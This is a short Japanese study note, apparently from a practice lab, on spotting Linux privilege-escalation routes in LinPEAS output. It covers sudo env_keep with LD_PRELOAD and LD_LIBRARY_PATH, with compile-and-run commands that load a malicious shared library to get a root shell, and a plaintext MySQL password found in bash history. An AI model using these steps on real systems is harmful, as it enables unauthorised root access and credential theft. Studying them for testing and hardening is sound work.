# Linpeaseあれこれ

## sudoセクション

### env_keep+=LD_PRELOAD

- env_keep+=LDPRELOADがついている
- さらに、sudo -lで、sudoの登録が確認できる

```bash
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.htm
l#sudo-and-suid
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
```

- また、Linpeasを使用せずとも、以下のコマンドでも確認ができる。

```bash
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
```

上記コマンド実行の際に、[悪意あるso](~/Oreshicrecord/records/writeups/code/preload.c)_を読み込ませて、root昇格ができる。

```bash
gcc -fPIC -shared -nostartfiles -o ./preload.so ./preload.c

sudo LD_PRELOAD=./preload.so find
(root) #
```

### env_keep+=LD_LIBRARY_PATH

LDD（List Dynamic Dependencies: 動的ライブラリのハイジャック）を狙う。

- env_keep+=LD_LIBRARY_PATHがついている
- さらに、sudo -lで、共有ライブラリを参照しているコマンドがある。

例：
```bash
apache2, nginx, sshd, cron, crond, rsyslogd
```

- 対象のコマンドが動的に読み込んでいるライブラリ一覧を確認

```bash
ldd /usr/sbin/apache2
```


上記コマンド実行の際に、[悪意あるso](~/Oreshicrecord/records/writeups/code/library_path.c)_を読み込ませて、root昇格ができる。

```bash
gcc -fPIC -shared -o ./libcrypt.so.1 ./library_path.c

sudo LD_LIBRARY_PATH=./libcrypt.so.1 apache2
(root) #
```

### 履歴からパスワード

linpeasの以下の部分も確認ポイント

```bash
╔══════════╣ Searching passwords in history files
/home/user/.bash_history:mysql -h somehost.local -uroot -ppassword123
```
